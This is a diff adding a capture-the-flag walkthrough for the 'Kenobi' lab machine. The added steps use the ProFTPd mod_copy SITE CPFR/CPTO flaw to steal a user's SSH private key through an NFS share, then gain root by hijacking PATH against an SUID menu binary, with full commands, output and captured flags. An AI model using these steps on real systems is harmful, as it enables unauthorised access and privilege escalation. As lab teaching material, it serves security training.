@@ -381,4 +381,245 @@ WU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroFTPD 1.3.4 FTP - gl
 Shellcodes: No Results
 ```
 
-As ProFTPd is running in version 1.3.5, there are 3 exploits we can use.
+As ProFTPd is running in version 1.3.5, there are 3 exploits we can use.  One of the exploits allows us to to copy files from any part of the filesystem to a chosen destination without authentication (see: https://www.cvedetails.com/cve/CVE-2015-3306/).
+
+*We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.*
+
+No answer needed
+
+*We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.+
+
+No answer needed
+
+*What is Kenobi's user flag (/home/kenobi/user.txt)?*
+
+We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands. We first use `nc` to connect to the server via `nc 10.10.16.1 21`.
+
+On the server we execute to copy the private key to to /var/tmp.
+
+``` 
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+```
+We can also take a shortcut here and directly copy user.txt.
+
+``` 
+SITE CPFR /home/kenobi/user.txt
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/user.txt
+250 Copy successful
+```
+
+We can now mount 10.10.16.1:/var to get the flag and kenobis ssh key:
+
+```
+root@kali:~# mkdir /mnt/kenobiNFS
+root@kali:~# mount 10.10.16.1:/var /mnt/kenobiNFS
+root@kali:~# ls -la /mnt/kenobiNFS/
+total 56
+drwxr-xr-x 14 root root    4096 Sep  4  2019 .
+drwxr-xr-x  3 root root    4096 Apr  6 06:57 ..
+drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
+lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
+drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
+drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
+lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
+drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
+drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root    4096 Apr  6 06:53 tmp
+drwxr-xr-x  3 root root    4096 Sep  4  2019 www
+root@kali:~# cd /mnt/kenobiNFS/tmp/
+root@kali:/mnt/kenobiNFS/tmp# more user.txt 
+d0b0f3f53b6caa532a83915e19224899
+```
+The flag is d0b0f3f53b6caa532a83915e19224899.
+
+### Privilege Escalation with Path Variable Manipulation
+
+*What file looks particularly out of the ordinary?* 
+
+After connecting via `ssh -i id_rsa kenobi@10.10.16.1` we can search for files that have the SUID bit set:
+
+```
+kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+```
+
+/usr/bin/menu looks interesting.
+
+*Run the binary, how many options appear?*
+
+```
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+```
+
+There are three options available.
+
+*What is the root flag (/root/root.txt)?*
+
+Strings is a command on Linux that looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname):
+
+```
+# strings /usr/bin/menu
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+__stack_chk_fail
+printf
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+UH-`
+AWAVA
+AUATL
+[]A\A]A^A_
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+curl -I localhost
+uname -r
+ifconfig
+ Invalid choice
+;*3$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7594
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+menu.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+_Jv_RegisterClasses
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+# 
+```
+
+As this file runs as the root users privileges, we can manipulate our path gain a root shell.
+
+We copied the /bin/sh shell, called it ifconfig, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "ifconfig" binary. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root:
+
+``` 
+kenobi@kenobi:~$ cd /tmp
+kenobi@kenobi:/tmp$ ls
+systemd-private-e2cb0b009eed452a9b06f9c9475774e1-systemd-timesyncd.service-aJ3cC4
+kenobi@kenobi:/tmp$ echo /bin/sh > ifconfig
+kenobi@kenobi:/tmp$ chmod 777 ifconfig
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :3
+# ls
+ifconfig  systemd-private-e2cb0b009eed452a9b06f9c9475774e1-systemd-timesyncd.service-aJ3cC4
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# cd /root/    
+# ls
+root.txt
+# more root.txt
+177b3cd8562289f37382721c28381f02
+# 
+```
+
+The flag is 177b3cd8562289f37382721c28381f02.
